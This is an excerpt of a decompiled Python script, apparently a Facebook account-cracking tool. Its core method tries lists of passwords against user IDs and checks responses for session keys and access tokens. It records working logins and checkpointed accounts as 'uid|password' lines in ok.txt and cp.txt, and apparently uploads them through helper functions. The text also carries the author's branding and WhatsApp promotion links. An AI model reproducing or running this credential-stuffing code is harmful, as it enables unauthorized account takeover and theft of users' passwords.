# Decompile by : SH'Sourov 
# Time Succes decompile : 2022-06-12 00:21:42.178972 
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://wa.me/+8801641255872"])
	exit(" [*] FACEBOOK :  SH Sourov")
...
def notice():
	...
	subprocess.check_output(["am", "start", "https://wa.me/+994400385410"])
...
\x1b[0;91m\x1b[1;43m                  SYC0 TH3 BR4ND :)                 \x1b[0m""")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [Sourov] : %s/%s -> \033[0;92m [ Sourov-OK:%s ]- \033[0;94m[Sourov-cp:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [Sourov-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;94m[Sourov-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [Sourov-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
